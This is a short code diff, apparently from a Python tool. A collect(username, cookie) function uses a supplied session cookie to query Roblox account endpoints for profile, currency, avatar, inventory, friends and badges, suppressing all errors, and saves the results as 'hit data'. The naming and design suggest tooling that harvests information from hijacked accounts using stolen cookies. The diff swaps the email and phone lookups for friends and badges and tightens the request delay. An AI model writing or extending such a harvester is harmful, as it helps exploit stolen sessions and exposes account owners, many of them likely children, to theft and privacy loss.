@@ -5,10 +5,10 @@ import config, store, util
 TARGETS = [
     ("profile", "https://users.roblox.com/v1/users/%d"),
     ("currency", "https://economy.roblox.com/v1/user/currency"),
-    ("email", "https://accountsettings.roblox.com/v1/email"),
-    ("phone", "https://accountsettings.roblox.com/v1/phone"),
     ("avatar", "https://avatar.roblox.com/v1/users/%d/avatar"),
     ("inventory", "https://inventory.roblox.com/v2/users/%d/inventory?limit=100"),
+    ("friends", "https://friends.roblox.com/v1/users/%d/friends/count"),
+    ("badges", "https://accountinformation.roblox.com/v1/users/%d/roblox-badges"),
 ]
 
 
@@ -35,7 +35,7 @@ def collect(username, cookie):
                         data[name] = j
                 except Exception:
                     pass
-                time.sleep(0.3)
+                time.sleep(0.25)
     except Exception:
         pass
     store.set_hit_data(username, json.dumps(data)[:200000])
